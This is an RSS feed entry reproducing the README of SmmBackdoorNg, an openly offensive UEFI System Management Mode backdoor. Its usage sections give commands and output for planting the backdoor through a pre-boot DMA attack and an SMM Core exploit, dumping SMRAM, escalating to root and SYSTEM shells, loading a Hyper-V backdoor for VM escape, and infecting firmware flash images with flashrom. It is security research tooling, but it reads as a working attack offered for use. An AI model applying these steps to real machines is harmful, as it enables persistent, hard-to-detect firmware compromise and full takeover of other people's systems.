<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-10-12T01:24:04Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Cr4sh/SmmBackdoorNg</title>
    <updated>2023-10-12T01:24:04Z</updated>
    <id>tag:github.com,2023-10-12:/Cr4sh/SmmBackdoorNg</id>
    <link href="https://github.com/Cr4sh/SmmBackdoorNg" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Updated version of System Management Mode backdoor for UEFI based platforms: old dog, new tricks&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SMM Backdoor Next Gen&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#general-information&#34;&gt;General information&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#backdoor-usage&#34;&gt;Backdoor usage&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#deploying-the-backdoor-using-firmware-flash-image-infection&#34;&gt;Deploying the backdoor using firmware flash image infection&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#using-together-with-hyper-v-backdoor&#34;&gt;Using together with Hyper-V Backdoor&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#building-from-the-source-code&#34;&gt;Building from the source code&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;General information&lt;/h2&gt; &#xA;&lt;p&gt;This version of System Management Mode backdoor for UEFI based platforms was heavily inspired by &lt;a href=&#34;http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html&#34;&gt;my previous project&lt;/a&gt; (check &lt;a href=&#34;https://github.com/Cr4sh/SmmBackdoor&#34;&gt;its GitHub repository&lt;/a&gt;) but introducing few key changes in order to make it more up to date:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In addition to the usual firmware flash image infection method as described in the article, new SMM backdoor also can be deployed with pre-boot DMA attack using &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze&#34;&gt;PCI Express DIY hacking toolkit&lt;/a&gt; (see &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/raw/master/python/uefi_backdoor_simple.py&#34;&gt;uefi_backdoor_simple.py&lt;/a&gt; program usage for more details) and industry-wide EFI SMM Core &lt;a href=&#34;https://github.com/Cr4sh/SmmBackdoorNg/raw/main/src/exploit.c&#34;&gt;vulnerability exploitation&lt;/a&gt; to perform DXE to SMM execution transition. The vulnerability &lt;a href=&#34;https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00144.html&#34;&gt;INTEL-SA-00144&lt;/a&gt; was discovered by myself and reported to Intel PSIRT &lt;a href=&#34;https://twitter.com/d_olex/status/877718172366798848&#34;&gt;years ago&lt;/a&gt;, but it still remains not patched on many products that using old EDK2 derived firmware code, including whole &lt;a href=&#34;https://www.ami.com/aptio/&#34;&gt;AMI Aptio&lt;/a&gt; family. Latest generations of Intel machines are likely not vulnerable to this attack.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Client program &lt;code&gt;smm_backdoor.py&lt;/code&gt; supports Windows and Linux systems and can interact with SMM backdoor using SW SMI (requires high privileges and &lt;a href=&#34;https://github.com/chipsec/chipsec&#34;&gt;chipsec&lt;/a&gt; installed) or APIC periodic timer method that can work with any privileges level.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;There&#39;s &lt;code&gt;smm_backdoor_privesc_linux.py&lt;/code&gt; and &lt;code&gt;smm_backdoor_privesc_win.py&lt;/code&gt; test client programs for SMM backdoor that demonstrating local privileges escalation under Windows and Linux by using its API provided by &lt;code&gt;smm_backdoor.py&lt;/code&gt; library.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SMM backdoor is fully virtualization-aware now, its library and client programs can work as expected inside Windows or Linux virtual machines running on the infected host system.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;SMM backdoor also can be used to load &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv&#34;&gt;my Hyper-V backdoor&lt;/a&gt; (which is also part of PCI Express DIY hacking toolkit) into the currently running hypervisor during RT phase and perform guest to host VM escape attacks. Test client program &lt;code&gt;smm_backdoor_hyper_v.py&lt;/code&gt; is used for integration with Hyper-V backdoor and its deployment.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Backdoor usage&lt;/h2&gt; &#xA;&lt;p&gt;Project documentation is incomplete at this moment, but here&#39;s some command line examples.&lt;/p&gt; &#xA;&lt;p&gt;Deploying SMM backdoor UEFI driver with PCI Express DIY hacking toolkit using &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze#practical-dma-attacks&#34;&gt;pre-boot DMA attack&lt;/a&gt;, DXE to SMM execution transition exploit mentioned above will be started automatically once backdoor driver will be loaded:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi&#xA;[+] Using UEFI system table hook injection method&#xA;[+] Reading DXE phase payload from SmmBackdoorNg_X64.efi&#xA;[+] Waiting for PCI-E link...&#xA;[!] PCI-E endpoint is not configured by root complex yet&#xA;[!] PCI-E endpoint is not configured by root complex yet&#xA;[!] Bad MRd TLP completion received&#xA;[+] PCI-E link with target is up&#xA;[+] Device address is 01:00.0&#xA;[+] Looking for DXE driver PE image...&#xA;[+] PE image is at 0x7a070000&#xA;[+] EFI_SYSTEM_TABLE is at 0x7a03e018&#xA;[+] EFI_BOOT_SERVICES is at 0x7a38fa30&#xA;[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4&#xA;Backdoor image size is 0x49a0&#xA;Backdoor entry RVA is 0x20fc&#xA;Planting DXE stage driver at 0xc0000...&#xA;Hooking LocateProtocol(): 0x7a3987b4 -&amp;gt; 0x000c20fc&#xA;1.852231 sec.&#xA;[+] DXE driver was planted, waiting for backdoor init...&#xA;[+] DXE driver was executed&#xA;[+] DONE&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In case if you&#39;re going to deploy SMM backdoor with PCI Express DIY hacking toolkit âˆ’ I would recommend to get used &lt;a href=&#34;https://www.xilinx.com/products/boards-and-kits/ek-z7-zc706-g.html&#34;&gt;Xilinx ZC706&lt;/a&gt; from e-Bay rather than &lt;a href=&#34;https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html&#34;&gt;older SP605&lt;/a&gt; evaluation kit, since this board has &lt;a href=&#34;https://github.com/Cr4sh/zc_pcie_dma&#34;&gt;better design&lt;/a&gt;, can perform DMA attacks faster and its &lt;a href=&#34;https://www.xilinx.com/products/design-tools/vivado.html&#34;&gt;development tools&lt;/a&gt; are more suitable for modern day use.&lt;/p&gt; &#xA;&lt;p&gt;In addition, you also can deploy the backdoor using &lt;a href=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/main/#deploying-the-backdoor-using-firmware-flash-image-infection&#34;&gt;firmware flash image infection&lt;/a&gt; described below in the next section.&lt;/p&gt; &#xA;&lt;p&gt;Basic use of SMM backdoor &lt;code&gt;smm_backdoor.py&lt;/code&gt; client program to display backdoor debug messages buffer once it was loaded and system has been booted:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --debug&#xA;****** Chipsec Linux Kernel module is licensed under GPL 2.0&#xA;[+] Obtaining backdoor debug information...&#xA;[+] Debug output buffer physical address is 0x79da4000&#xA;&#xA;00000001 - backdoor.c(1573) : ******************************&#xA;00000002 - backdoor.c(1574) :&#xA;00000003 - backdoor.c(1575) :   SMM backdoor loaded&#xA;00000004 - backdoor.c(1576) :&#xA;00000005 - backdoor.c(1577) : ******************************&#xA;00000006 - backdoor.c(1589) : Resident code base address is 0x79d9f000&#xA;00000007 - backdoor.c(1502) : BackdoorResidentDma()&#xA;00000008 - backdoor.c(313) : Protocol notify handler is at 0x79d9f364&#xA;00000009 - backdoor.c(1423) : SMM access 2 protocol is at 0x778fe650&#xA;00000010 - backdoor.c(1424) : Available SMRAM regions:&#xA;00000011 - backdoor.c(1434) :  * 0x7b000000:0x7b000fff&#xA;00000012 - backdoor.c(1434) :  * 0x7b001000:0x7b7fffff&#xA;00000013 - exploit.c(242) : SMM communicate header is at 0x79da2ae0&#xA;00000014 - exploit.c(256) : Executing SMM callback...&#xA;00000015 - backdoor.c(1215) : Running in SMM&#xA;00000016 - backdoor.c(1216) : SMM system table is at 0x7b7f84c0&#xA;00000017 - backdoor.c(1177) : Max. SW SMI value is 0xff&#xA;00000018 - backdoor.c(1188) : SW SMI handler is at 0x7b5effb8&#xA;00000019 - exploit.c(271) : Communicate(): status = 0xe, size = 0x19&#xA;00000020 - exploit.c(277) : Exploit(): Exploitation success&#xA;00000021 - backdoor.c(409) : SmmCtlHandle(): Periodic timer SW SMI was enabled&#xA;00000022 - backdoor.c(1328) : new_SetVirtualAddressMap()&#xA;00000023 - backdoor.c(1369) : New address of the resident image is 0xfffffffeec79f000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Check for responding backdoor and show basic information about System Management Mode execution environment:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --use-timer --test&#xA;[+] Checking if SMM backdoor is present...&#xA;[+] Obtaining information...&#xA;&#xA;  CR0 = 0x80000033&#xA;  CR3 = 0x7b7b1000&#xA; SMST = 0x7b7f84c0&#xA;&#xA;[+] SMRAM regions:&#xA;&#xA; * 0x7b000000:7b000fff&#xA; * 0x7b001000:7b7fffff&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example of reading of arbitrary physical memory, beginning of SMRAM region in this case:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --use-timer --read-phys 0x7b000000 --size 0x80&#xA;7b000000: 53 4d 4d 53 33 5f 36 34 90 c5 7d 7b 00 00 00 00 | SMMS3.64........&#xA;7b000010: 00 60 7a 7b 00 00 00 00 00 80 00 00 00 00 00 00 | ..z.............&#xA;7b000020: 33 00 00 80 00 00 00 00 00 10 7b 7b 00 00 00 00 | 3...............&#xA;7b000030: 68 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | h...............&#xA;7b000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................&#xA;7b000050: 00 00 00 00 00 00 00 00 00 00 c0 84 7f 7b 00 00 | ................&#xA;7b000060: 00 00 e1 13 e0 12 e0 12 f0 12 e1 13 f1 03 f1 03 | ................&#xA;7b000070: f1 02 e1 13 e0 12 e0 12 e0 02 e1 13 f1 03 f1 03 | ................&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To read and dump entire SMRAM regions into the file you can use the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backdoor.py --dump-smram&#xA;****** Chipsec Linux Kernel module is licensed under GPL 2.0&#xA;[+] Dumping SMRAM regions, this may take a while...&#xA;[+] Creating SMRAM_dump_7b000000_7b7fffff.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example of &lt;code&gt;smm_backdoor_privesc_linux.py&lt;/code&gt; client program usage for local privileges escalation under the Linux operating system:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python2 smm_backdoor_privesc_linux.py&#xA;[+] Initializing SMM backdoor client...&#xA;[+] User CR3 = 0x271b14000&#xA;[+] LSTAR = 0xffffffff81e00010&#xA;[+] do_syscall_64() is at 0xffffffff810025c0&#xA;[+] sys_call_table() is at 0xffffffff822001a0&#xA;[+] sys_getuid() is at 0xffffffff81073c10&#xA;[+] task_struct offset is 0x14d40&#xA;[+] cred offset is 0x628&#xA;[+] IA32_KERNEL_GS_BASE = 0xffff888277a00000&#xA;[+] Process task_struct is at 0xffff88827148db00&#xA;[+] Process cred is at 0xffff88827289d000&#xA;[+] Overwriting process credentials...&#xA;[+] Done, spawning root shell...&#xA;&#xA;sh-4.4# id&#xA;uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example of &lt;code&gt;smm_backdoor_privesc_win.py&lt;/code&gt; client program usage for local privileges escalation under the Windows operating system:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; python2 smm_backdoor_privesc_win.py&#xA;[+] Initializing SMM backdoor client...&#xA;[+] NT version is 10.0.19041&#xA;[+] _EPROCESS Token offset is 0x04b8&#xA;[+] _KPCR KernelDirectoryTableBase offset is 0x9000&#xA;[+] _KPCR structure is at 0xfffff8005f486000&#xA;[+] KVA shadow is disabled or not present&#xA;[+] Kernel CR3 value is 0x0000000141491000&#xA;[+] Token object address is 0xffffcd0ef752c060&#xA;[+] Present privileges: 0x1e73deff20 -&amp;gt; 0x1ff2ffffbc&#xA;[+] Enabled privileges: 0x60900000 -&amp;gt; 0x1ff2ffffbc&#xA;[+] Current process object address is 0xffffa60de954a080&#xA;[+] System process object address is 0xffffa60de12dd080&#xA;[+] Overwriting process token...&#xA;[+] Done, spawning SYSTEM shell...&#xA;&#xA;Microsoft Windows [Version 10.0.19041.208]&#xA;(c) 2020 Microsoft Corporation. All rights reserved.&#xA;&#xA;C:\&amp;gt; whoami&#xA;nt authority\system&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Deploying the backdoor using firmware flash image infection&lt;/h2&gt; &#xA;&lt;p&gt;To infect platform firmware stored in the flash chip on the motherboard with SMM backdoor you will need some SPI flash programmer, I prefer to use cheap and widely available &lt;a href=&#34;https://www.ftdichip.com/Support/Documents/DataSheets/Modules/DS_FT2232H_Mini_Module.pdf&#34;&gt;FT2232H Mini Module&lt;/a&gt; from FTDI. Also, there&#39;s a &lt;a href=&#34;https://www.crowdsupply.com/securinghw/tigard&#34;&gt;board called Tigrad&lt;/a&gt; âˆ’ multi-protocol, multi-voltage tool for hardware hacking that can work as SPI flash programmer. In addition to the programmer you also will need the following tools:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/LongSoft/UEFITool/releases/tag/0.28.0&#34;&gt;UEFITool&lt;/a&gt; utility to parse and edit UEFI flash images&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/flashrom/flashrom/releases/tag/v1.2&#34;&gt;Flashrom&lt;/a&gt; utility to work with SPI flash programmer&lt;/li&gt; &#xA; &lt;li&gt;SOIC8 &lt;a href=&#34;https://www.sparkfun.com/products/13153&#34;&gt;test clip&lt;/a&gt; or &lt;a href=&#34;https://www.sparkfun.com/products/9741&#34;&gt;probe hook&lt;/a&gt; clips kit to connect programmer to the flash chip without its de-soldering&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;First of all, you have to disassemble the machine and locate SPI flash chip with platform firmware. Usually, it&#39;s &lt;a href=&#34;https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf&#34;&gt;W25Q64&lt;/a&gt; or &lt;a href=&#34;https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf&#34;&gt;W25Q128&lt;/a&gt; Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module. Itâ€™s more convenient to use SOIC8 test clip than probe hook clips, but very often thereâ€™s not enough free space around the chip to place test clip.&lt;/p&gt; &#xA;&lt;p&gt;In case if you happen to find WSON8 packaged chip on you board instead of usual SOIC8 âˆ’ you can either de-solder it or use some sort of DIY &lt;a href=&#34;https://mouser.com/c/?q=pogo%20pin&#34;&gt;spring-loaded pogo pin&lt;/a&gt; test probe like this one to tap its pads:&lt;/p&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_probe.jpg&#34; width=&#34;424&#34;&gt; &#xA;&lt;p&gt;Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:&lt;/p&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/spi_wiring.png&#34; width=&#34;542&#34;&gt; &#xA;&lt;p&gt;Now you can read flash chip contents using Flashrom:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# flashrom -p ft2232_spi:type=2232H,port=A â€“r firmware.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After that you need to open dumped firmware in UEFITool, locate arbitrary UEFI SMM driver to infect and extract its PE32 image section from the firmware image:&lt;/p&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Cr4sh/SmmBackdoorNg/master/docs/images/uefi_tool.png&#34; width=&#34;701&#34;&gt; &#xA;&lt;p&gt;For example, I picked &lt;code&gt;NvramSmm&lt;/code&gt; UEFI SMM driver responsible for NVRAM access as pretty much suitable one. Then you can infect extracted driver with SMM backdoor using &lt;code&gt;--infect&lt;/code&gt; command line option of &lt;code&gt;smm_backkdoor.py&lt;/code&gt; program:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# python2 smm_backkdoor.py --infect NvramSmm.bin --output NvramSmm_infected.bin --payload SmmBackdoorNg_X64.efi&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After that you have to replace original driver image with &lt;code&gt;NvramSmm_infected.bin&lt;/code&gt; one in UEFITool, save resulting firmware image and flash it back into the chip:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# flashrom -p ft2232_spi:type=2232H,port=A â€“w firmware_infected.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Using together with Hyper-V Backdoor&lt;/h2&gt; &#xA;&lt;p&gt;Once you have SMM backdoor loaded, as it shown above, you can use its capabilities to load Hyper-V backdoor during runtime phase with appropriate client program running inside arbitrary guest or host Hyper-V partition.&lt;/p&gt; &#xA;&lt;p&gt;To do that you need to save &lt;code&gt;backdoor.bin&lt;/code&gt; file &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/raw/master/python/payloads/DmaBackdoorHv/backdoor.bin&#34;&gt;form Hyper-V backdoor repository&lt;/a&gt; as &lt;code&gt;hyper_v_backdoor.bin&lt;/code&gt; in the same folder with &lt;code&gt;smm_backdoor_hyper_v.py&lt;/code&gt; test client program and then just run it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; python2 smm_backdoor_hyper_v.py&#xA;[+] Initializing SMM backdoor client...&#xA;[+] Searching for VMCS structure in physical memory, this might take a while...&#xA;&#xA; Scan step: 0x0000000001000000&#xA; Scan from: 0x0000000100000000&#xA;   Scan to: 0x0000000200000000&#xA;&#xA;[+] Hypervisor VMCS structure was found&#xA;&#xA; Physical address: 0x0000000109341000&#xA;         HOST_CR3: 0x0000000100103000&#xA;         HOST_RIP: 0xfffff87b6963236a&#xA;&#xA;[+] HvlpLowMemoryStub() is at 0x0000000000002000&#xA;[+] Host operating system version is 2004&#xA;[+] VM exit handler is at 0xfffff87b6960e010&#xA;[+] VM exit handler call is at 0xfffff87b69632440&#xA;[+] 14 bytes jump is at 0xfffff87b69632466&#xA;[+] Backdoor entry is at 0x0000000000002700&#xA;[+] Backdoor code size is 860 bytes&#xA;[+] Patching VM exit handler call...&#xA;[+] Done, Hyper-V backdoor was successfully installed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In case when &lt;code&gt;smm_backdoor_hyper_v.py&lt;/code&gt; is unable to locate target VMCS region âˆ’ you can override its default scanning options by specifying appropriate values in &lt;code&gt;--scan-from&lt;/code&gt;, &lt;code&gt;--scan-to&lt;/code&gt; and &lt;code&gt;--scan-step&lt;/code&gt; command line arguments of the program. Since VMCS region location stage might take a while, you also can use &lt;code&gt;--verbose&lt;/code&gt; option of the program to display operation progress information.&lt;/p&gt; &#xA;&lt;p&gt;After successful Hyper-V backdoor load you can run &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_client&#34;&gt;its client program&lt;/a&gt; to ensure that backdoor is up and responding:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; .\hyper_v_backdoor_client.exe 0&#xA;[+] Running on CPU #0&#xA;[+] Hyper-V backdoor is running&#xA;&#xA;      Hypervisor CR0: 0x80010031&#xA;      Hypervisor CR3: 0x100103000&#xA;      Hypervisor CR4: 0x422e0&#xA; Hypervisor IDT base: 0xfffff87b69a00180 (limit = 0xffff)&#xA;  Hypervisor GS base: 0xfffff87b69ba6000&#xA;        VMCS address: 0x109341000&#xA;     VM exit handler: 0xfffff87b6960e010&#xA;       VM exit count: 0x86ed&#xA;       VM call count: 0x2518&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more information about Hyper-V backdoor client program and performing guest to host VM escape attacks on Windows targets you can &lt;a href=&#34;https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv#vm-escape-related-commands&#34;&gt;check usage examples&lt;/a&gt; in Hyper-V backdoor documentation.&lt;/p&gt; &#xA;&lt;h2&gt;Building from the source code&lt;/h2&gt; &#xA;&lt;p&gt;To compile SMM backdoor UEFI driver &lt;code&gt;SmmBackdoorNg_X64.efi&lt;/code&gt; you need to have a Windows machine with &lt;a href=&#34;https://visualstudio.microsoft.com/downloads/&#34;&gt;Visual Studio&lt;/a&gt; and &lt;a href=&#34;https://github.com/tianocore/edk2&#34;&gt;EDK II source code&lt;/a&gt; installed.&lt;/p&gt; &#xA;&lt;p&gt;To build project from the source code you need to perform the following steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Install Visual Studio and EDK II &lt;a href=&#34;https://github.com/tianocore/tianocore.github.io/wiki/Common-instructions&#34;&gt;following its setup instructions&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Copy &lt;code&gt;SmmBackdoorNg&lt;/code&gt; project directory into the EDK source code directory.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Edit &lt;code&gt;Conf/target.txt&lt;/code&gt; file of EDK, set &lt;code&gt;ACTIVE_PLATFORM&lt;/code&gt; value to &lt;code&gt;OvmfPkg/OvmfPkgX64.dsc&lt;/code&gt; and &lt;code&gt;TOOL_CHAIN_TAG&lt;/code&gt; in according to your installed version of Visual Studio.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Edit &lt;code&gt;OvmfPkg/OvmfPkgX64.dsc&lt;/code&gt; file of EDK and add &lt;code&gt;SmmBackdoorNg/SmmBackdoorNg.inf&lt;/code&gt; line at its end.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Open Visual Studio command prompt and change current directory to previously copied &lt;code&gt;SmmBackdoorNg&lt;/code&gt; directory.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Execute &lt;code&gt;build&lt;/code&gt; command to compile SMM backdoor UEFI driver.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Resulting image file will be created in appropriate sub-directory of &lt;code&gt;Build/OvmfX64/&lt;/code&gt; EDK directory depending on used build target and Visual Studio version.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;About&lt;/h2&gt; &#xA;&lt;p&gt;Developed by:&lt;br&gt; Dmytro Oleksiuk (aka Cr4sh)&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;mailto:cr4sh0@gmail.com&#34;&gt;cr4sh0@gmail.com&lt;/a&gt;&lt;br&gt; &lt;a href=&#34;http://blog.cr4.sh&#34;&gt;http://blog.cr4.sh&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>